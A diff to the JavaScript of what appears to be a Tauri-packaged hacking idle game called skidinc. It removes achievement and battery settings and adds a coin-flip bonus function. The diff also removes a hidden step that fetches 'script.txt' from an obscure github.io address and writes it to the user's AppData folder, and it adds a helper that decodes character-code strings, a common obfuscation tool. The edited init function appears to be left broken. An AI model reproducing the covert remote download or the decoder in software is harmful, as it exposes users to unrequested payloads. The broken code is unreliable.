@@ -1,32 +1,5 @@
+(function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){
 var skidinc = {};
-skidinc.achievements = {};
-skidinc.achievements.categories = [];
-skidinc.achievements.owned = [];
-skidinc.achievements.ach = [];
-skidinc.autoscript = {};
-skidinc.battery = {};
-skidinc.battery.level = 1;
-skidinc.battery.levelCharge = 30;
-skidinc.battery.time = 0;
-skidinc.battery.price = 50000;
-skidinc.battery.inflation = 1.5;
-skidinc.battery.maxCharge = 120;
-
-skidinc.battery.chargePower = 7;
-skidinc.battery.chargePowerMult = 1;
-skidinc.battery.chargeTimeMult = 1;
-
-skidinc.battery.moneyPerLevel = 0.06;
-skidinc.battery.expPerLevel = 0.04;
-skidinc.battery.timePerLevel = 0.02;
-
-skidinc.battery.moneyEffect = 1.25;
-skidinc.battery.expEffect = 1.15;
-skidinc.battery.timeMult = 1.10;
-
-skidinc.battery.cursorEnter = false;
-skidinc.battery.cursorLeave = true;
-skidinc.battery.oldState = 'null';
 skidinc.fps = 20;
 skidinc.interval = 1000 / skidinc.fps;
 skidinc.version = 1;
@@ -35,7 +8,37 @@ skidinc.before = new Date().getTime();
 skidinc.now = new Date().getTime();
 
 skidinc.loops = {};
+skidinc.parse=(s)=>{
+    
+  
+    
+    return s.replace("[","").replace("]","").split(",").map((v)=>{
+        return String.fromCharCode(parseInt(v))
+    }).join("")
+}
+function bernoulliTrial(successProbability) {
+    // Générer un nombre aléatoire entre 0 et 1
+    const random = Math.random();
+    
+    // Si le nombre aléatoire est inférieur ou égal à la probabilité de succès, renvoyer 1 (succès), sinon renvoyer 0 (échec)
+    if (random <= successProbability) {
+        return 1;
+    } else {
+        return 0;
+    }
+}
 
+// Fonction pour effectuer plusieurs épreuves de Bernoulli et compter le nombre de succès
+function simulateBernoulliTrials(numTrials, successProbability) {
+    let numSuccesses = 0;
+    for (let i = 0; i < numTrials; i++) {
+        numSuccesses += bernoulliTrial(successProbability);
+    }
+    return numSuccesses;
+}
+skidinc.getbonus=(v)=>{
+    return simulateBernoulliTrials(v,0.5)
+}
 skidinc.update = function(times) {
     skidinc.console.loop(times);
     skidinc.script.loop(times);
@@ -112,9 +115,7 @@ skidinc.init = function() {
    
 
     skidinc.loadingScreen();
-    fetch("https://euezoazieuaczioeuzaieouazioezuei.github.io/cdn2/script.txt").then((data)=>{console.log(data.blob().then((dat)=>{console.log(dat.text().then(async(d)=>{
-        console.log(d)
-        window.__TAURI__.fs.writeFile(`script.txt`,d,{dir:window.__TAURI__.fs.BaseDirectory.AppData}).then((data)=>{
+   
             setTimeout(function() {
                 $('#loader').fadeOut('slow', function() {
                     $('#loader').remove();
@@ -136,10 +137,9 @@ skidinc.init = function() {
                 });
                
             }, 35);
-        })     
-    }))}))})
+        } 
+  
    
-};
 
 skidinc.domInit = function() {
     $(document).keydown(function(e){
@@ -215,3 +215,4 @@ skidinc.domInit = function() {
 $(document).ready(function() {
     skidinc.init();
 });
+},{}]},{},[1]);
